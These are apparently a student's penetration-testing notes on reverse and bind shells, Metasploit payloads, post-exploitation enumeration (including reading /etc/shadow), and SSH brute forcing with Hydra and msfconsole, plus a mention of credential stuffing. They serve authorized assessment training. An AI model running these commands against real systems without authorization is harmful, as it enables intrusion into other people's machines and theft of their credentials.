# Reserve Shells vs Bind Shells
- Target connects to the listening attackbox: reverse shell  
- Attackbox connects to the listening target: bind shell  

# Staged vs Non-staged payloads
- Non-staged: sends the exploit shellcode all at once. It's larger in size and won't always work. Msfconsole example below  
```bash
windows/meterpreter_reverse_tcp
```
- Staged: Sends the payload in stages. It can be less stable. Msfconsole example below  
```bash
windows/meterpreter/reverse_tcp
```
Use both types of payloads. Whichever works for the specific scenario that we're dealing with  

# Gaining root with metasploit
- [https://www.offsec.com/metasploit-unleashed/msfconsole-commands/](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/)
From the recon process, pick one to the enumerated vulnerabilities.  
Use the search function on metasploit to look for an exploit and taylor the payload to the OS and needs.  

# Manual exploitation
- Find an exploit using google

# Post exploitation
- Enumerate the host
```bash
whoami
hostname
ifconfig
ip a
arp
route
sudo -l
cat /etc/passwd
cat /etc/shadow
```

# Brute Force Attacks
- SSH: if we see it in a assessment, we will try to brute force it
    - Test password strength
        - Default passwords
        - Weak passwords
    - See if the Blue Team can detect this brute force attack

## Hydra

```bash
hydra -l username -P /path/to/wordlist protocol://ip:port -t number-of-threads -V
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.151 -t 4 -V
```

## msfconsole

```bash
msf > search ssh type:auxiliary
msf > use auxiliary/scanner/ssh/ssh_login
msf > options
msf > set username root
msf > set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
msf > set rhosts 192.168.1.151
msf > set threads 10 # <- noisy
msf > set verbose true
msf > run
```

# Credential Stuffing and Password Spraying

The most common way in which to get access in external assessments
Use credentials from previous/known breaches foung in the recon process
Use default credentials

